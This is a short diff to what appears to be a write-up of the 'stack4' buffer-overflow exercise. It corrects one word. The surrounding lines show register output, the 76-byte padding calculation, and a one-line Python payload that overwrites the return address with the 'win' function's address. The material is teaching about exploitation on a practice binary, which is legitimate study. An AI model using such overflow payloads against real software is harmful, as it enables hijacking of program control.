@@ -51,7 +51,7 @@ info reg
 >>>ebp            0xbffffc68       0xbffffc68
 ```
 
-From here we will reverse work the location of the stack to be `0xbffffc20` and we will have to fill till `0xbffffc68 + 4` that gives us a total of 76char before injecting our `win` location
+From here we will reverse engineer the location of the stack to be `0xbffffc20` and we will have to fill till `0xbffffc68 + 4` that gives us a total of 76char before injecting our `win` location
 
 ```shell
 python -c 'print "1"*76 + "\xf4\x83\x04\x08"' | ./stack4
